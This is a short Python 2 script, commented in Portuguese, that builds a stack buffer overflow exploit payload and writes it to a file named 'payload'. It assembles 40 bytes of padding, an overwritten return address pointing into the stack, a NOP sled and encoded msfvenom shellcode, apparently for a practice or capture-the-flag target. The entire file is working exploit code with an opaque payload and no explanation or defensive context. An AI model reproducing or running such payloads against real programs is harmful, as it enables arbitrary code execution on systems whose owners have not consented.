#!usr/bin/env python2
from struct import *

buf = ""
# Padding
buf += "A"*40
# Endereco modificado do rip
buf += pack("<Q", 0x7fffffffdcb0)
# Nops
buf += b"\x90"*100
# Saida do msfvenom
buf += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x6b\xa9\x0f\x38\xc1"
buf += b"\x24\x23\x01\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x5a\x56\x65\x31\x99\xbd\x95\x11\x23"
buf += b"\x20\xd9\x75\xf0\xed\x49\x23\x2a\xf3\x65\x3f\x9b"
buf += b"\x2b\x26\x49\xee\x69\x77\x69\xab\x2e\x62\x58\x3b"
buf += b"\xc3\x26\x60\x58\x4e\x21\x5e\x01\xa8\x51\x37\xc4"
buf += b"\x6c\xa6\xc1\x13\x92\x47\xaf\x89\x9d\x21\x01\x7e"
buf += b"\x1a\xcf\x90\xc0\x28\x72\x49\xe2\x4f\x65\x28\x9b"
buf += b"\x4e\x09\x59\x64\xac\x56\x70\x44\xe4\x5a\x24\x22"
buf += b"\x56\xc6\x4c\xd9\x73\x49\x22\x33\xc3\x0f\x52\xc4"
buf += b"\x6c\xaa\xe6\x23\x98\xf9\x37\xc4\x7d\x7a\x5e\x23"
buf += b"\x2c\xcf\x41\x06\x4e\x1f\x59\x01\xa8\x50\x37\xc4"
buf += b"\x7a\x49\x27\x31\xa6\x0a\x70\x44\xe4\x5b\xec\x94"
buf += b"\x4f\x0f\x38\xc1\x24\x23\x01"
with open("payload", "w") as f:
    f.write(buf)
